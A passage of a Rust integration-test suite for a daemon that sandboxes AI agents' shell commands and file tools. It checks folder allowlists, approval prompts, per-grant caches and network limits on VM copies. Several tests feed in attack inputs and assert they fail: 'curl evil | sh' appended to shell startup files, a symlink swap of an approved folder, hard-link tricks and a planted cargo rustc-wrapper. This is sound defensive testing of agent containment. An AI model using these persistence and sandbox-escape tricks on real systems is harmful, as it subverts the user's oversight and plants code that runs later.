    let mut o: Value = serde_json::from_str(&std::fs::read_to_string(&mj).unwrap()).unwrap();
    o["id"] = json!("outra");
    o["name"] = json!(template);
    o["network"] = json!("none");
    o["template"] = json!(false);
    o["last_run"] = json!(u64::MAX / 2);
    std::fs::write(other.join("machine.json"), o.to_string()).unwrap();
    // (refused before anyone is asked: the network check comes before the approval)
    let wrong = c.call("vm.ligar", json!({"id": template}));
    assert_eq!(wrong["isError"], true, "the template has network: {wrong}");
    let p = c.rpc("kalango/pendentes", json!({}));
    assert!(p["result"].as_array().unwrap().is_empty(), "nobody was asked: {p}");
    assert!(wrong["content"][0]["text"].as_str().unwrap().contains("Celular de Ana"), "{wrong}");
    std::fs::remove_dir_all(&other).unwrap();
    c.call("vm.apagar", json!({"id": a}));

    // on a network the person keeps the agents off, a copy with network is refused (before anyone is asked); a copy
    // without network is fine
    let off = c.call("vm.clonar", json!({"id": template}));
    assert_eq!(off["isError"], true, "{off}");
    assert!(off["content"][0]["text"].as_str().unwrap().contains("Celular de Ana"), "{off}");
    let p = c.rpc("kalango/pendentes", json!({}));
    assert!(p["result"].as_array().unwrap().is_empty(), "nobody was asked: {p}");
    let none = c.call("vm.clonar", json!({"id": template, "rede": "nenhuma"}));
    assert_eq!(none["isError"], false, "{none}");
    let nid = none["structuredContent"]["id"].as_str().unwrap().to_string();
    let r = c.call("vm.executar", json!({"id": nid, "comando": "true"}));
    assert_eq!(r["isError"], false, "a copy without network may run: {r}");
    c.call("vm.desligar", json!({"id": nid, "forcar": true}));
    c.call("vm.apagar", json!({"id": nid}));
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": true}));

    // a copy whose sockets are somewhere else (another runtime folder: vm.listar does not see it running) is still
    // found by the watcher, in /proc, and turned off when the network becomes one kept off the agents
    let run = tempfile::Builder::new().prefix("kvdr").tempdir_in("/tmp").unwrap();
    std::fs::set_permissions(run.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
    // (made through a second kalangod whose VirtualDesk calls use that other runtime folder)
    let mut env2: Vec<(&str, &str)> = env.iter().copied().filter(|(k, _)| *k != "KALANGOD_VIGIA_REDE_MS").collect();
    let run_s = run.path().to_str().unwrap().to_string();
    env2.push(("XDG_RUNTIME_DIR", &run_s));
    let d2 = start_full_env(true, "", |c| c, &env2);
    let mut c2 = Client::new(&d2.sock);
    let made = c2.call("vm.clonar", json!({"id": template}));
    let b = made["structuredContent"]["id"].as_str().unwrap_or_else(|| panic!("{made}")).to_string();
    let running = |id: &str| {
        std::fs::read_dir("/proc").unwrap().flatten().any(|e| {
            std::fs::read(e.path().join("cmdline")).is_ok_and(|c| String::from_utf8_lossy(&c).contains(&format!("process=kvd-{id}")))
        })
    };
    assert!(running(&b), "the copy runs");
    let seen = c.call("vm.listar", json!({})).to_string();
    assert!(!seen.contains("\"rodando\""), "kalangod's own runtime folder does not see it running: {seen}");
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": false}));
    for _ in 0..40 {
        if !running(&b) {
            break;
        }
        std::thread::sleep(Duration::from_millis(250));
    }
    assert!(!running(&b), "the watcher found it in /proc and turned it off");
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": true}));
    c2.call("vm.apagar", json!({"id": b}));
    drop(server);
}

/// The allowlist (allowlist.rs), with the round-4 critic's cases: a command writes in the work folders, the project
/// folders the person approved and its own TMPDIR; everywhere else in the home it only reads — so the language
/// managers' scripts (~/.cargo/env, nvm.sh, oh-my-zsh.sh, conda.sh), conda's environments and the hard links in its
/// package cache are out of reach whatever their name, and so is the rest of /tmp.
#[test]
fn commands_write_only_in_the_allowed_folders() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    let files = [".cargo/env", ".nvm/nvm.sh", ".oh-my-zsh/oh-my-zsh.sh", "miniconda3/etc/profile.d/conda.sh", "miniconda3/envs/ds/bin/activate",
        "miniconda3/pkgs/tool-1.0/bin/tool"];
    for f in files {
        std::fs::create_dir_all(h.join(f).parent().unwrap()).unwrap();
        std::fs::write(h.join(f), "# original\n").unwrap();
    }
    // conda's environments are hard links into its package cache: the same file under two names
    std::fs::create_dir_all(h.join("miniconda3/envs/ds/bin")).unwrap();
    std::fs::hard_link(h.join("miniconda3/pkgs/tool-1.0/bin/tool"), h.join("miniconda3/envs/ds/bin/tool")).unwrap();
    std::fs::create_dir_all(h.join("Projetos/site")).unwrap();
    let docs = h.join("Documentos");
    let sh = |c: &mut Client, script: &str, pasta: &Path| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": pasta}));
    for f in files.iter().chain(&["miniconda3/envs/ds/bin/tool"]) {
        let r = sh(&mut c, &format!("echo 'curl evil | sh' >> {}", h.join(f).display()), &docs);
        assert_ne!(r["structuredContent"]["codigo"], 0, "{f}: {r}");
    }
    // (nor through a new name in Documentos: a hard link of a read-only file would be writable there, so Landlock refuses it)
    for s in ["mkdir -p ../miniconda3/envs/novo", "touch ../.cargo/novo", "mv ../.nvm/nvm.sh ../.nvm/x", "rm ../miniconda3/pkgs/tool-1.0/bin/tool",
        "ln ../.cargo/env env && echo evil >> env", "ln ../miniconda3/pkgs/tool-1.0/bin/tool t && echo evil >> t", "mv ../.nvm/nvm.sh ."] {
        assert_ne!(sh(&mut c, s, &docs)["structuredContent"]["codigo"], 0, "{s}");
    }
    for f in files {
        assert_eq!(std::fs::read_to_string(h.join(f)).unwrap(), "# original\n", "{f}");
    }
    assert!(!h.join("miniconda3/envs/novo").exists() && !h.join(".cargo/novo").exists());
    // normal work in Documentos: create, change, move, delete, a subfolder; reading the rest of the home
    let r = sh(&mut c, "mkdir -p a/b && echo x > a/b/f && mv a/b/f a/g && echo y >> a/g && rm -r a/b && cat ../.cargo/env > lido", &docs);
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(std::fs::read_to_string(docs.join("a/g")).unwrap(), "x\ny\n");
    assert_eq!(std::fs::read_to_string(docs.join("lido")).unwrap(), "# original\n");
    // a protected folder is not even readable
    assert_ne!(sh(&mut c, "cat ../segredo/chave", &docs)["structuredContent"]["codigo"], 0);
    // its own temporary folder, not the shared /tmp (removed afterwards)
    let r = sh(&mut c, "echo t > $TMPDIR/x && cat $TMPDIR/x && echo $TMPDIR", &docs);
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    let tmp = r["structuredContent"]["saida"].as_str().unwrap().lines().nth(1).unwrap().to_string();
    assert!(tmp.starts_with("/tmp/kalango-tarefa-"), "{tmp}");
    assert!(!Path::new(&tmp).exists(), "the task's temporary folder is removed: {tmp}");
    let shared = format!("/tmp/kalango-teste-allowlist-{}", std::process::id());
    assert_ne!(sh(&mut c, &format!("echo x > {shared}"), &docs)["structuredContent"]["codigo"], 0);
    assert!(!Path::new(&shared).exists());
    // a project folder: refused until the person approves it — once (this process), then for good
    let site = h.join("Projetos/site");
    assert_ne!(sh(&mut c, "echo x > index.html", &site)["structuredContent"]["codigo"], 0);
    let ans = approve_next(d.sock.clone());
    let r = c.call("tarefas.pedir_pasta", json!({"pasta": "~/Projetos/site"}));
    ans.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(r["structuredContent"]["sempre"], false);
    let r = sh(&mut c, "echo x > index.html && mkdir -p src && echo y > src/a.js", &site);
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert!(c.rpc("kalango/pastas", json!({}))["result"]["projetos"].as_array().unwrap().is_empty(), "only this task");
    // the approval card showed the folder's path and summary
    let mut pend = None;
    let asker = std::thread::spawn({
        let sock = d.sock.clone();
        move || Client::new(&sock).call("tarefas.pedir_pasta", json!({"pasta": "~/Projetos"}))
    });
    for _ in 0..200 {
        let p = c.rpc("kalango/pendentes", json!({}));
        if let Some(x) = p["result"].as_array().and_then(|a| a.first()).cloned() {
            pend = Some(x);
            break;
        }
        std::thread::sleep(Duration::from_millis(25));
    }
    let pend = pend.expect("asked");
    assert_eq!(pend["level"], "pasta", "{pend}");
    assert_eq!(pend["cartao"]["caminho"], "~/Projetos", "{pend}");
    assert_eq!(pend["cartao"]["arquivos"], 2, "{pend}");
    assert_eq!(pend["cartao"]["entradas"], json!(["site/"]), "{pend}");
    let id = pend["id"].as_u64().unwrap().to_string();
    Command::new(BIN).args(["aprovar", &id, "--sempre"]).env("KALANGOD_SOCKET", &d.sock).output().unwrap();
    let r = asker.join().unwrap();
    assert_eq!(r["structuredContent"]["sempre"], true, "{r}");
    let list = c.rpc("kalango/pastas", json!({}))["result"].clone();
    assert_eq!(list["projetos"][0]["caminho"], "~/Projetos", "{list}");
    assert_eq!(list["projetos"][0]["origem"], "aprovada");
    assert_eq!(list["trabalho"], json!(["~/Documentos"]));
    // never the home, a hidden folder, or one holding a protected folder: refused before asking
    for bad in ["~", "~/.cargo", "~/miniconda3/../.nvm", "/etc"] {
        assert_eq!(c.call("tarefas.pedir_pasta", json!({"pasta": bad}))["isError"], true, "{bad}");
    }
    assert_eq!(c.call("tarefas.pedir_pasta", json!({"pasta": "~/../"}))["isError"], true);
    // taken out: read only again
    assert_eq!(c.rpc("kalango/pastas_remover", json!({"caminho": "~/Projetos"}))["result"]["removida"], true);
    assert_ne!(sh(&mut c, "echo z > outro.txt", &h.join("Projetos"))["structuredContent"]["codigo"], 0);
}

/// Installing for the person (`pip install --user`) writes outside the work folders: asked first, for that command
/// only, with where it writes; denied, it does not run; approved, it writes there and nowhere else.
#[test]
fn installing_for_the_person_asks_once() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    std::fs::create_dir_all(h.join(".local/lib")).unwrap();
    std::fs::create_dir_all(h.join(".local/bin")).unwrap();
    std::fs::create_dir_all(h.join("ferramentas")).unwrap();
    // a stand-in for pip: writes where `pip install --user` writes, and tries a startup file too
    let pip = h.join("ferramentas/pip");
    std::fs::write(&pip, format!("#!/bin/sh\necho pkg > {h}/.local/lib/pkg.py\necho '#!/bin/sh' > {h}/.local/bin/pkg\necho evil >> {h}/.bashrc\nexit 0\n", h = h.display())).unwrap();
    std::fs::set_permissions(&pip, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    std::fs::write(h.join(".bashrc"), "ok\n").unwrap();
    let args = json!({"programa": pip, "argumentos": ["install", "--user", "pkg"], "pasta": h.join("Documentos")});
    let ans = answer_startup(d.sock.clone(), "negar");
    let r = c.call("tarefas.executar", args.clone());
    let (req, always) = ans.join().unwrap();
    assert_eq!(req["level"], "instalar", "{req}");
    assert_eq!(req["no_always"], true);
    assert!(always.contains("sempre") || always.contains("always"), "{always}");
    assert_eq!(req["cartao"]["escreve"], json!(["~/.local/lib", "~/.local/bin"]), "{req}");
    assert_eq!(r["isError"], true, "{r}");
    assert!(!h.join(".local/lib/pkg.py").exists());
    let ans = approve_next(d.sock.clone());
    let r = c.call("tarefas.executar", args.clone());
    ans.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(std::fs::read_to_string(h.join(".local/lib/pkg.py")).unwrap(), "pkg\n");
    assert!(h.join(".local/bin/pkg").exists());
    assert_eq!(std::fs::read_to_string(h.join(".bashrc")).unwrap(), "ok\n");
    // the approval was for that command only: the next one asks again (denied here)
    let ans = answer_startup(d.sock.clone(), "negar");
    assert_eq!(c.call("tarefas.executar", args)["isError"], true);
    assert_eq!(ans.join().unwrap().0["level"], "instalar");
}


/// A raw JSON-RPC call from another program (python): not the person's interface.
fn rpc_from_python(sock: &Path, method: &str, params: Value) -> Value {
    let script = format!("import json,socket,sys\ns=socket.socket(socket.AF_UNIX);s.connect(sys.argv[1]);f=s.makefile('rw')\n\
        f.write(json.dumps({{'jsonrpc':'2.0','id':1,'method':{m:?},'params':json.loads(sys.argv[2])}})+'\\n');f.flush();print(f.readline())", m = method);
    let out = Command::new("python3").args(["-c", &script, sock.to_str().unwrap(), &params.to_string()]).output().unwrap();
    serde_json::from_slice(&out.stdout).unwrap_or(Value::Null)
}

/// Round 1 of the review: an approved folder swapped for a link (`mv site site.bak && ln -s .. site`) is not followed
/// when the rules are made — the approval is dropped and recorded — whether it was for this task or "always"; a path
/// through a link is never approved; only the person's interface adds or takes out folders.
#[test]
fn approved_folders_are_pinned_and_only_the_person_manages_them() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    for f in [".cargo/env", ".nvm/nvm.sh", ".config/git/config"] {
        std::fs::create_dir_all(h.join(f).parent().unwrap()).unwrap();
        std::fs::write(h.join(f), "# original\n").unwrap();
    }
    std::fs::create_dir_all(h.join("Projetos/site")).unwrap();
    let sh = |c: &mut Client, script: &str, pasta: &Path| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": pasta}));
    let ask = |c: &mut Client, pasta: &str, always: bool| {
        let a = if always { approve_next_always(d.sock.clone()) } else { approve_next(d.sock.clone()) };
        let r = c.call("tarefas.pedir_pasta", json!({"pasta": pasta}));
        a.join().unwrap();
        r
    };
    // the critic's repro: both approved for this task, the project swapped for a link to the home
    assert_eq!(ask(&mut c, "~/Projetos/site", false)["isError"], false);
    assert_eq!(ask(&mut c, "~/Projetos", false)["isError"], false);
    let r = sh(&mut c, "mv site site.bak && ln -s .. site", &h.join("Projetos"));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    // (an agent cannot take the parent's grant away to leave only the swapped one)
    let rm = rpc_from_python(&d.sock, "kalango/pastas_remover", json!({"caminho": "~/Projetos"}));
    assert!(rm["error"].is_object(), "{rm}");
    for f in [".cargo/env", ".nvm/nvm.sh", ".config/git/config"] {
        let r = sh(&mut c, &format!("echo EVIL >> {}", h.join(f).display()), &h.join("Projetos/site"));
        assert_ne!(r["structuredContent"]["codigo"], 0, "{f}: {r}");
        assert_eq!(std::fs::read_to_string(h.join(f)).unwrap(), "# original\n", "{f}");
    }
    // the drop is in the timeline
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    assert!(regs.iter().any(|e| e["tool"] == "kalango/pastas" && e["status"] == "negado" && e["args"]["pasta"] == "~/Projetos/site"), "{regs:?}");
    // the parent folder, still the one approved, still works
    assert_eq!(sh(&mut c, "echo ok > ok.txt", &h.join("Projetos"))["structuredContent"]["codigo"], 0);
    // "always": the same swap drops it for good
    std::fs::remove_file(h.join("Projetos/site")).unwrap();
    std::fs::rename(h.join("Projetos/site.bak"), h.join("Projetos/site")).unwrap();
    assert!(c.rpc("kalango/pastas_remover", json!({"caminho": "~/Projetos"}))["result"]["removida"] == true);
    assert_eq!(ask(&mut c, "~/Projetos/site", true)["structuredContent"]["sempre"], true);
    std::fs::rename(h.join("Projetos/site"), h.join("Projetos/site.bak")).unwrap();
    std::os::unix::fs::symlink("..", h.join("Projetos/site")).unwrap();
    let r = sh(&mut c, &format!("echo EVIL >> {}", h.join(".cargo/env").display()), &h.join("Projetos/site"));
    assert_ne!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(std::fs::read_to_string(h.join(".cargo/env")).unwrap(), "# original\n");
    assert!(c.rpc("kalango/pastas", json!({}))["result"]["projetos"].as_array().unwrap().is_empty(), "dropped from the list");
    // a path through a link is never approved (not even to an ordinary folder), nor one holding a PATH folder
    let r = c.call("tarefas.pedir_pasta", json!({"pasta": "~/Projetos/site"}));
    assert_eq!(r["isError"], true, "{r}");
    std::fs::create_dir_all(h.join("Imagens/ferramentas/bin")).unwrap();
    assert_eq!(c.call("tarefas.pedir_pasta", json!({"pasta": "~/Imagens/ferramentas"}))["isError"], true);
    // only the person's interface adds: another program (an MCP client outside the agents' slice) is refused
    let add = rpc_from_python(&d.sock, "kalango/pastas_adicionar", json!({"caminho": "~/Projetos/site.bak"}));
    assert!(add["error"].is_object(), "{add}");
    assert!(c.rpc("kalango/pendentes", json!({}))["result"].as_array().unwrap().is_empty(), "no card for it");
    // inside a work folder: nothing to add (no card, no entry)
    std::fs::create_dir_all(h.join("Documentos/notas")).unwrap();
    let r = c.rpc("kalango/pastas_adicionar", json!({"caminho": "~/Documentos/notas"}));
    assert!(r["result"].is_object(), "{r}");
    assert!(c.rpc("kalango/pastas", json!({}))["result"]["projetos"].as_array().unwrap().is_empty());
}

/// "Only this task" is listed while it lasts, and taking it out ends it.
#[test]
fn task_grants_are_listed_and_can_be_taken_back() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("Projetos/api")).unwrap();
    let a = approve_next(d.sock.clone());
    assert_eq!(c.call("tarefas.pedir_pasta", json!({"pasta": "~/Projetos/api"}))["isError"], false);
    a.join().unwrap();
    let l = c.rpc("kalango/pastas", json!({}))["result"].clone();
    let t = &l["tarefa"][0];
    assert_eq!(t["caminho"], "~/Projetos/api", "{l}");
    let left = t["ate"].as_u64().unwrap().saturating_sub(std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs());
    assert!((1700..=1800).contains(&left), "at most 30 min: {left}");
    let sh = |c: &mut Client| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo x > a.txt"], "pasta": d.area.join("Projetos/api")}));
    assert_eq!(sh(&mut c)["structuredContent"]["codigo"], 0);
    assert_eq!(c.rpc("kalango/pastas_remover", json!({"caminho": "~/Projetos/api"}))["result"]["removida"], true);
    assert_ne!(sh(&mut c)["structuredContent"]["codigo"], 0);
    assert!(c.rpc("kalango/pastas", json!({}))["result"]["tarefa"].as_array().unwrap().is_empty());
}

/// Builds work in a project folder with the agents' own caches (never the person's: those feed the person's own
/// builds), and nothing of /dev/shm is shared.
#[test]
fn builds_use_the_agents_caches() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    std::fs::create_dir_all(h.join(".cargo/registry")).unwrap();
    std::fs::create_dir_all(h.join(".cache/go-build")).unwrap();
    std::fs::create_dir_all(h.join("Documentos/app")).unwrap();
    let sh = |c: &mut Client, script: &str| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": h.join("Documentos/app")}));
    let r = sh(&mut c, "echo $CARGO_HOME $npm_config_cache $GOCACHE $GOMODCACHE $PIP_CACHE_DIR $XDG_CACHE_HOME");
    let out = r["structuredContent"]["saida"].as_str().unwrap().trim().to_string();
    // (this grant's own folder in the agents' caches)
    let cache = Path::new(out.split(' ').next().unwrap()).parent().unwrap().to_path_buf();
    assert_eq!(cache.parent().unwrap(), std::fs::canonicalize(h).unwrap().join(".cache/kalango-agentes"), "{out}");
    for (v, sub) in out.split(' ').zip(["cargo", "npm", "go-build", "go-mod", "pip", "xdg"]) {
        assert_eq!(Path::new(v), cache.join(sub), "{out}");
    }
    // writable for commands: a registry download, an npm cache entry; the person's caches are not
    let r = sh(&mut c, "mkdir -p $CARGO_HOME/registry/cache/x && echo crate > $CARGO_HOME/registry/cache/x/a.crate && mkdir -p $npm_config_cache/_cacache && echo n > $npm_config_cache/_cacache/i");
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    for p in ["../../.cargo/registry/x", "../../.cache/go-build/x", "../../.cache/x"] {
        assert_ne!(sh(&mut c, &format!("echo x > {p}"))["structuredContent"]["codigo"], 0, "{p}");
    }
    // no shared memory folder
    assert_ne!(sh(&mut c, &format!("echo x > /dev/shm/kalango-teste-{}", std::process::id()))["structuredContent"]["codigo"], 0);
    // a real build: Go (the system's), with its build and module caches in the agents' folder (no VCS stamping:
    // when the test area sits inside a checkout, the enclosing .git is outside the command's folders)
    if Path::new("/usr/bin/go").exists() {
        let r = sh(&mut c, "export GOFLAGS=-buildvcs=false && go mod init exemplo.local/app && printf 'package main\\nimport \"fmt\"\\nfunc main() { fmt.Println(\"ok\") }\\n' > main.go && go build -o app . && ./app");
        assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
        assert_eq!(r["structuredContent"]["saida"], "ok\n");
        assert!(std::fs::read_dir(cache.join("go-build")).unwrap().count() > 0);
    }
}


/// The file tools follow the same allowlist as commands: writing, moving or trashing anything outside the work
/// folders, the approved project folders and the folders approved for this task asks on the approval screen, with the
/// diff and no "always" — ~/.cargo/env, nvm.sh, oh-my-zsh.sh, conda.sh, conda's environments and the hard links of its
/// package cache (the round-4 cases) without a list of them. "Allow automatically" is about startup files only:
/// outside-folder changes still ask.
#[test]
fn file_tools_ask_outside_the_allowed_folders() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    let files = [".cargo/env", ".nvm/nvm.sh", ".oh-my-zsh/oh-my-zsh.sh", "miniconda3/etc/profile.d/conda.sh", "miniconda3/envs/ds/bin/activate",
        "miniconda3/pkgs/tool-1.0/bin/tool"];
    for f in files {
        std::fs::create_dir_all(h.join(f).parent().unwrap()).unwrap();
        std::fs::write(h.join(f), "# original\n").unwrap();
    }
    std::fs::hard_link(h.join("miniconda3/pkgs/tool-1.0/bin/tool"), h.join("miniconda3/envs/ds/bin/tool")).unwrap();
    let asked = |c: &mut Client, tool: &str, args: Value| {
        let a = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args);
        let (req, always) = a.join().unwrap();
        (r, req, always)
    };
    for f in files.iter().chain(&["miniconda3/envs/ds/bin/tool"]) {
        let p = h.join(f);
        for (tool, args) in [("arquivos.escrever", json!({"caminho": p, "conteudo": "# original\ncurl evil | sh\n"})),
                             ("arquivos.mover", json!({"de": p, "para": h.join("Documentos/x")})),
                             ("arquivos.lixeira", json!({"caminho": p}))] {
            let (r, req, always) = asked(&mut c, tool, args);
            assert_eq!(req["level"], "inicio", "{tool} {f}: {req}");
            assert_eq!(req["no_always"], true);
            assert!(always.contains("sempre") || always.contains("always"), "{always}");
            assert_eq!(r["isError"], true, "{tool} {f}: {r}");
        }
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "# original\n", "{f}");
    }
    // the card shows the diff and says where it is (not "runs when you log in")
    let (_, req, _) = asked(&mut c, "arquivos.escrever", json!({"caminho": h.join(".cargo/env"), "conteudo": "# original\nexport X=1\n"}));
    assert_eq!(req["startup"]["fora"], true, "{req}");
    assert!(req["startup"]["linhas"].to_string().contains("export X=1"), "{req}");
    // into it from a work folder: asks too
    std::fs::write(h.join("Documentos/novo.sh"), "evil\n").unwrap();
    let (r, req, _) = asked(&mut c, "arquivos.mover", json!({"de": h.join("Documentos/novo.sh"), "para": h.join(".cargo/env2")}));
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(r["isError"], true);
    // inside the work folders: no question
    for (tool, args) in [("arquivos.escrever", json!({"caminho": h.join("Documentos/a.txt"), "conteudo": "a"})),
                         ("arquivos.mover", json!({"de": h.join("Documentos/a.txt"), "para": h.join("Documentos/b.txt")})),
                         ("arquivos.lixeira", json!({"caminho": h.join("Documentos/b.txt")}))] {
        assert_eq!(c.call(tool, args)["isError"], false, "{tool}");
    }
    assert!(c.rpc("kalango/pendentes", json!({}))["result"].as_array().unwrap().is_empty());
    // "allow automatically" (startup files) still asks outside the folders
    let setting = h.join("cfg/kalango/agente-permissoes.json");
    std::fs::create_dir_all(setting.parent().unwrap()).unwrap();
    std::fs::write(&setting, r#"{"arquivos_de_inicio": "livre"}"#).unwrap();
    let (r, req, _) = asked(&mut c, "arquivos.escrever", json!({"caminho": h.join(".nvm/nvm.sh"), "conteudo": "x\n"}));
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(r["isError"], true);
    assert_eq!(std::fs::read_to_string(h.join(".nvm/nvm.sh")).unwrap(), "# original\n");
    // and approved, it is written (the person saw the diff)
    let a = approve_next(d.sock.clone());
    let r = c.call("arquivos.escrever", json!({"caminho": h.join(".nvm/nvm.sh"), "conteudo": "# atualizado\n"}));
    a.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(std::fs::read_to_string(h.join(".nvm/nvm.sh")).unwrap(), "# atualizado\n");
}


/// A `tools/call` from a Python client (another program than the test: a caller rule of its own can match it).
fn call_from_python(sock: &Path, tool: &str, args: Value) -> Value {
    rpc_from_python(sock, "tools/call", json!({"name": tool, "arguments": args}))["result"].clone()
}

/// Round 2 of the review (c1.py): the agents' build caches are per grant — a caller and the exact folders it may
/// write. A narrow caller (only ~/Documentos) cannot plant a cargo `rustc-wrapper` (or anything in npm's or pip's
/// cache) that a caller with an approved project then runs with its access; and the settings files of a cache are
/// not writable by commands at all.
#[test]
fn agents_caches_do_not_cross_grants() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let py = String::from_utf8(Command::new("python3").args(["-c", "import os,sys; print(os.path.realpath(sys.executable))"]).output().unwrap().stdout).unwrap();
    let py = py.trim().to_string();
    let d = start_in(Some(Path::new(env!("CARGO_TARGET_TMPDIR"))), true, "", |cfg| {
        let area = cfg.split("allowed_paths = [\"").nth(1).unwrap().split('"').next().unwrap().to_string();
        cfg.replace("[[callers]]", &format!("[[callers]]\nname = \"estreito\"\nexe_prefix = \"{py}\"\nmax_level = \"total\"\nallowed_paths = [\"{area}/Documentos\"]\n\n[[callers]]"))
    }, &[]);
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    std::fs::create_dir_all(h.join("Projetos/site")).unwrap();
    let a = approve_next_always(d.sock.clone());
    assert_eq!(c.call("tarefas.pedir_pasta", json!({"pasta": "~/Projetos/site"}))["isError"], false);
    a.join().unwrap();
    // the narrow caller: its own cache, whose cargo settings it cannot write; its npm/pip cache entries stay its own
    let plant = "printf '[build]\\nrustc-wrapper = \"/tmp/evil\"\\n' > $CARGO_HOME/config.toml; echo cache=$CARGO_HOME; mkdir -p $npm_config_cache/_cacache && echo evil > $npm_config_cache/_cacache/planted && mkdir -p $PIP_CACHE_DIR/wheels && echo evil > $PIP_CACHE_DIR/wheels/planted";
    let r = call_from_python(&d.sock, "tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", plant], "pasta": h.join("Documentos")}));
    let narrow = r["structuredContent"].clone();
    assert!(narrow["erros"].as_str().unwrap_or("").contains("config.toml"), "settings are read only: {narrow}");
    let narrow_cache = narrow["saida"].as_str().unwrap().trim().strip_prefix("cache=").unwrap().to_string();
    // the broad caller (project approved): another cache, without what was planted
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo $CARGO_HOME; cat $CARGO_HOME/config.toml; ls $npm_config_cache/_cacache $PIP_CACHE_DIR/wheels 2>&1"], "pasta": h.join("Projetos/site")}));
    let out = r["structuredContent"]["saida"].as_str().unwrap().to_string();
    let broad_cache = out.lines().next().unwrap().to_string();
    assert_ne!(broad_cache, narrow_cache, "{out}");
    assert!(!out.contains("rustc-wrapper") && !out.contains("planted"), "{out}");
    // and the narrow one's own settings stayed clean too
    assert!(!std::fs::read_to_string(Path::new(&narrow_cache).join("config.toml")).unwrap_or_default().contains("evil"));
    // cargo can still lock and fetch into its cache
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo x > $CARGO_HOME/.package-cache && mkdir -p $CARGO_HOME/registry/index/x && echo $HOME"], "pasta": h.join("Projetos/site")}));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(Path::new(r["structuredContent"]["saida"].as_str().unwrap().trim()), std::fs::canonicalize(h).unwrap(), "HOME is the person's");
}

/// An approved `cargo install` / `go install` lands where the card says (~/.cargo/bin, ~/go/bin made as the person),
/// not in the agents' cache.
#[test]
fn approved_installs_land_where_the_card_says() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    std::fs::create_dir_all(h.join(".cargo/bin")).unwrap();
    std::fs::create_dir_all(h.join("ferramentas")).unwrap();
    use std::os::unix::fs::PermissionsExt;
    // stand-ins with the tools' own rules for where an install goes
    for (name, target) in [("cargo", "${CARGO_HOME:-$HOME/.cargo}/bin"), ("go", "${GOBIN:-${GOPATH:-$HOME/go}/bin}")] {
        let p = h.join(format!("ferramentas/{name}"));
        std::fs::write(&p, format!("#!/bin/sh\nmkdir -p \"{target}\" && echo bin > \"{target}/ferramenta-{name}\" && echo \"{target}\"\n")).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
        let (ans, args) = (approve_next(d.sock.clone()), json!({"programa": p, "argumentos": ["install", "ferramenta"], "pasta": h.join("Documentos")}));
        let r = c.call("tarefas.executar", args);
        ans.join().unwrap();
        assert_eq!(r["structuredContent"]["codigo"], 0, "{name}: {r}");
    }
    let real = std::fs::canonicalize(h).unwrap();
    assert!(real.join(".cargo/bin/ferramenta-cargo").exists());
    assert!(real.join("go/bin/ferramenta-go").exists(), "~/go/bin made and used");
    let cache = real.join(".cache/kalango-agentes");
    let stray = std::process::Command::new("find").arg(&cache).args(["-name", "ferramenta-*"]).output().unwrap().stdout;
    assert!(stray.is_empty(), "nothing installed in the agents' cache: {}", String::from_utf8_lossy(&stray));
}

/// Python's multiprocessing (a Lock, a process pool) in a command: with kalangod as root, each task has its own
/// /dev/shm; without root there is none, and the result says why.
#[test]
fn multiprocessing_has_its_own_shared_memory_or_says_why() {
    if !has_user_systemd() && !nix::unistd::geteuid().is_root() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
